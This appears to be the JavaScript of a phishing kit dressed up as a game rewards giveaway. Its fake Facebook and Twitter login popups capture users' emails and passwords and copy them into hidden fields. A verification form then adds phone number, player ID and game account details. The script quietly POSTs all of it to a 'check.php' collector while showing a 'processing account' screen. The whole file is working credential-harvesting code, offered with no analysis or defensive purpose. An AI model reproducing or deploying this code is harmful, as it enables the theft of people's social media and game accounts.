// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_rewardsBox(){
	$('.rewardsBox').show();
	$('.rewardsHome').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login(){
	$('.account_login').show();
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".itemReward_confirmation").hide()
	$(".otherReward_confirmation").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login-twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};